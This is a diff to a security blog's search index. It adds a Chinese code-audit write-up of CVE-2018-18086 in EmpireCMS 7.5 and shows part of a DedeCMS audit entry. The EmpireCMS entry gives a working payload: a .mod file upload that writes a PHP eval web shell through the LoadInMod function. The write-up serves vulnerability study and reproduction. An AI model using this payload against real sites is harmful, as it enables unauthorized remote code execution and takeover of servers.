@@ -1,6 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>EmpireCMSv7.5代码审计</title>
+    <url>/2021/03/%C2%96EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>环境上没遇到啥问题</p><h3 id="CVE-2018-18086-后台getshell"><a href="#CVE-2018-18086-后台getshell" class="headerlink" title="CVE-2018-18086 后台getshell"></a>CVE-2018-18086 后台getshell</h3><p>EmpireCMS  7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的<code>/e/class/moddofun.php</code>的<code>LoadInMod</code>函数存在安全漏洞,未对变量<code>$file</code>做任何处理，直接上传，接着就包含该文件。</p><a id="more"></a>
+
+
+
+
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="屏幕截图 2021-03-17 212415"></p>
+<p>对此我们直接全局寻找<code>LoadInMod</code>的调用，在<code>e/admin/ecmsmod.php</code></p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220115927.png" alt="image-20210317220115927"></p>
+<ul>
+<li><p>漏洞复现</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="屏幕截图 2021-03-17 220503"></p>
+<p>新建一个<code>1.mod</code>的文件，内容为</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"../data/getshell.php"</span>,<span class="string">"&lt;?php @eval(\$_POST[a]); ?&gt;"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>上传成功后，即可得到shell</p>
+<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220729395.png" alt="image-20210317220729395"></p>
+</li>
+</ul>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/LEOGG321/p/13882655.html" target="_blank" rel="noopener">https://www.cnblogs.com/LEOGG321/p/13882655.html</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>CMS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DedeCMSv5.7SP2代码审计</title>
     <url>/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>这里需要注意的是</p><p>dedecms在php5.4以上会因为session_register()等函数已移除，无法正常运行</p><p>在include/userlogin.class.php中代码替换,被替换代码大致在288到304行之间,代码如下:</p><p>代码如下:</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserPurviewTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepAdminStyleTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><a id="more"></a>
@@ -1151,8 +1182,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>web</tag>
         <tag>python</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1674,8 +1705,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>复现</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -2818,8 +2849,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
         <tag>PHP</tag>
+        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
       </tags>
   </entry>
   <entry>
